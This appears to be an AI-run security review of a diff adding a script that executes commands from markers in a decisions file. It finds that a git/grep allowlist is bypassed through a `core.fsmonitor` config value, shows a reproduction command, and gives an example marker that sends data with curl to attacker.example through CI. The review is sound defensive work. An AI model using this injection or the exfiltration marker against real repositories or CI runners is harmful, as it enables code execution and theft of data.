# Security review — FEAT-38-decisions-current-knowledge — `7ebfc9e..3928c70`

## Verdict: HIGH finding present — the document-to-shell path is exploitable

## The document-to-shell path in `check-decision-claims.py` — explicit verdict

**Bypassable.** `check-decision-claims.py` (new file, pin `3928c70`) parses `<!-- claim: <command> :: <substring> -->`
markers out of `.harness/harness/docs/DECISIONS.md` and runs `<command>` for real. The intended safety boundary
is stated in its own docstring and in D-10 (`plan.yaml:146-155`): *"refuses any command whose first word is not
git or grep, and never uses a shell … keeps a documentation file from becoming an arbitrary code execution
surface."*

- Mechanism: `shlex.split(command)` then `subprocess.run(tokens, capture_output=True, text=True, timeout=10)`
  — `check-decision-claims.py:96-107`. No `shell=True` anywhere (confirmed; also asserted by the diff's own
  `test_checker_source_never_uses_shell_true`, `test-check-decision-claims.py:1364-1373`).
- Allowlist: `ALLOWED_FIRST_TOKENS = {"git", "grep"}` — `check-decision-claims.py:76`, enforced at `:99-104`.
- **The allowlist is the whole control, and it is insufficient**: `git` itself has a shell-out primitive.
  `git -c core.fsmonitor=<string> <any command that touches the index, e.g. status>` runs `<string>` through
  `/bin/sh -c` as a hook, because a non-boolean `core.fsmonitor` value is treated as a hook command, not a
  boolean flag. The first token is still `git`, so the checker's allowlist never sees the injected command.
- **Measured, not theoretical** (O-02): reproduced the exact call the checker makes —
  `subprocess.run(shlex.split('git -c core.fsmonitor="touch /tmp/pwned" status'), capture_output=True, text=True, timeout=10)`
  — against a scratch repo. `touch` executed; file appeared; `returncode == 0`. Full transcript available on
  request, tokens observed: `['git', '-c', 'core.fsmonitor=touch /tmp/pwned', 'status']`, identical shape to
  what the checker builds.

## Reachability — this is wired into CI, not a dormant code path

1. `test-check-decision-claims.py` carries `test_live_authority_claims_all_hold` (`:1358-1394`), which runs
   `check-decision-claims.py --file <repo>/.harness/harness/docs/DECISIONS.md` — the **live** document, not a
   fixture (by design, per the file's own docstring: it "guards the AUTHORITY itself").
2. `test-check-decision-claims.py` is registered in `INTEGRATION_SCRIPTS` at `run-unit-tests.sh:31` (confirmed
   by parsing the array at the pin: `'test-check-decision-claims.py' in names → True`), and mirrored in
   `.harness/harness.json`'s `integration.detect` glob.
3. `.github/workflows/tests.yml` runs `run-unit-tests.sh --kind integration` in the **"Integration suite"**
   step, triggered `on: pull_request` (every branch toward `main`) and `on: push` (`main` only) — confirmed by
   reading the workflow at the pin.

So: any PR that adds one HTML-comment claim marker to `DECISIONS.md` whose command is
`git -c core.fsmonitor="<payload>" status` gets that payload executed by CI automatically, on every push to
the PR branch, with no merge required. `on: pull_request` (not `pull_request_target`) means fork PRs get a
read-only `GITHUB_TOKEN` and no forwarded secrets — this bounds the blast radius below "steal repo secrets"
for external forks — but it does **not** prevent the code execution itself: the runner still executes
attacker-chosen shell commands with full network egress for up to 10s per marker, for same-repo/branch PRs
the token scope is whatever this repo's default `permissions:` grants (no `permissions:` block is declared in
`tests.yml`, so it inherits the org/repo default rather than being explicitly minimized).

**Failure scenario:** anyone who can open a PR against this repository adds
`<!-- claim: git -c core.fsmonitor="curl -s https://attacker.example/x --data-binary @-" status :: x -->`
inside a `## DEC-N` body in `DECISIONS.md`. CI's Integration suite step runs it unattended on every push to
that branch. The attacker gets arbitrary code execution in the Actions runner — network access, whatever the
runner's default `GITHUB_TOKEN` scope permits, and any content checked out into the workspace — regardless of
whether the PR is ever merged, reviewed, or the marker is later reverted.

**Severity: HIGH.** Confirmed exploitable (not theoretical), reachable through the change's own new,
CI-registered test with no additional preconditions, and it defeats a control the diff's own signed decision
(D-10) explicitly claims closes this exact exposure. This gates per contract (`gates.review: advisory_unless_high`).

Note for context: `DECISIONS.md` being treated as "byte-frozen" is an editorial/review-scope convention for
this panel, not a technical control in the repository — nothing in `check-domain.sh`'s write-guard or GitHub
branch protection stops a PR (including from an external contributor, or a same-repo branch by mistake) from
adding content to this file. The vulnerability does not depend on that convention holding.

## Everything else checked — clean

- **`check-decision-anchors.py`** (`file:line` anchors → file existence + line-count check): path handling is
  safe by construction. Resolution is **basename-only against `git ls-files`** output
  (`check-decision-anchors.py:79-92,109-113`) — `count_lines()` opens the *tracked* candidate path, never the
  attacker-supplied `cited_path` directly, so `../../etc/passwd:1` cannot be read (and would not even match
  `ANCHOR_RE`, which requires a whitelisted extension). No traversal, no arbitrary read.
- **`gen-decisions-index.py`**: no `subprocess`, no `os.environ`/`os.getenv`, no shell-out anywhere in the
  file (grepped at the pin — zero matches). The two stripped machineries (amendment-span computation,
  body-prose supersession detection) are pure regex/text removals with no security surface; diff reviewed
  line-by-line, nothing sanitization-shaped was deleted.
- **`.github/workflows/tests.yml` trigger**: `pull_request` (safe form), never `pull_request_target`. No
  `permissions:` block narrows the default token, which is a hardening gap but not itself exploitable by this
  diff's content — noted, not rated as its own finding since it's pre-existing workflow shape, not new in this
  diff.
- **Swept scripts** (`check-domain.sh`, `check-state.sh`, `run-unit-tests.sh`, `board_lifecycle.py`,
  `check-plan-routes.py`, `factory_decompose.py`, `gh-sync.py`, `harness_yaml.py`, `plan-merge.py`,
  `upgrade-config.py`, `validate-digest.py`, and the touched `test-*.py`): diffed every changed line across the
  full sweep for `curl|wget|eval|os.system|shell=True|` command substitution `` `...` ``/`$(...)`, and
  `subprocess.*`. Every hit is either a pre-existing, unchanged call site or comment/citation-text prose (e.g.
  `DEC-171 am.1` → `DEC-171`, `DEC-192` → `DEC-203`). No quoting changes, no new unquoted expansions, no new
  shell-outs introduced by the sweep.
- **Secret/credential sweep** across the full `7ebfc9e..3928c70` diff (`api_key|secret|token|password|BEGIN
  ... PRIVATE KEY|AKIA...|ghp_...|xox...`): every hit is a false positive on the English word "token"
  (`ALLOWED_FIRST_TOKENS`, "am.N token", DEC row citations). Nothing credential-shaped.
- **DECISIONS.md/DECISIONS-INDEX.md content itself**: the deletions, folds and new DEC-205 are prose-only;
  nothing in the diff to either file introduces executable content beyond the two claim markers at
  `DECISIONS.md:6290-6291`, which are themselves benign (`grep -F ... :: ALLOWED_FIRST_TOKENS = {"git",
  "grep"}` and `grep -F "test-check-decision-claims.py" ...`) — not the attack payload, just the checker
  proving its own allowlist string is present.

## Recommendation (not applied — no mandate to fix)

Narrow the allowlist from "first token is git or grep" to an explicit git-subcommand allowlist that excludes
`-c`/`-C`/`--exec-path`/`--upload-pack` etc. (e.g. only bare `git grep`, `git log`, `git show` with no config
override), or drop the `git` branch of the allowlist entirely and require `grep`-only claims, or execute
`git` claims with `-c protocol.ext.allow=never -c core.fsmonitor= -c core.pager=cat -c core.hooksPath=/dev/null`
prepended defensively. This is a constraint for the owner to sign, not this review's call.

```yaml
VERDICT: FAIL
DIGEST:
  headline: "check-decision-claims.py's git/grep allowlist is bypassed by `git -c core.fsmonitor=<cmd>`, confirmed executing arbitrary shell commands, and is wired into CI on every PR via test_live_authority_claims_all_hold — HIGH, gates the ship."
  in_scope: true
  scope_reason: "This diff adds a document-to-shell execution path (check-decision-claims.py) that CI runs automatically against attacker-reachable input (DECISIONS.md via a PR); that is a genuine new trust boundary regardless of the diff's otherwise-documentation shape."
  severity_max: high
  findings: 1
  must_fix:
    - "check-decision-claims.py:76,99-104 — the {\"git\",\"grep\"} first-token allowlist does not prevent RCE: `git -c core.fsmonitor=\"<shell command>\" status` (or any index-touching git subcommand) executes the config value via a shell-invoked hook, first token still 'git'. Confirmed by direct reproduction. Reachable via test_live_authority_claims_all_hold (test-check-decision-claims.py:1358-1394), registered in run-unit-tests.sh INTEGRATION_SCRIPTS and run by .github/workflows/tests.yml's Integration suite step on every `pull_request`. A PR adding one claim marker to DECISIONS.md gets arbitrary code executed in the CI runner on every push to that PR, unmerged, unreviewed."
  threat_model:
    - { boundary: "PR content (DECISIONS.md) -> CI Integration suite -> check-decision-claims.py -> subprocess.run(argv)", stride: T, mitigated: false }
    - { boundary: "check-decision-claims.py argv -> git binary -> `-c core.fsmonitor=` hook -> shell", stride: E, mitigated: false }
    - { boundary: "check-decision-anchors.py file:line anchor -> file read", stride: I, mitigated: true }
    - { boundary: "gen-decisions-index.py generation -> committed DECISIONS-INDEX.md", stride: I, mitigated: true }
  open_questions: []
  files_touched: []
  expertise_update: []
artifact: .harness/harness/features/FEAT-38-decisions-current-knowledge/notes/review-harness-security-reviewer-c0.md
```
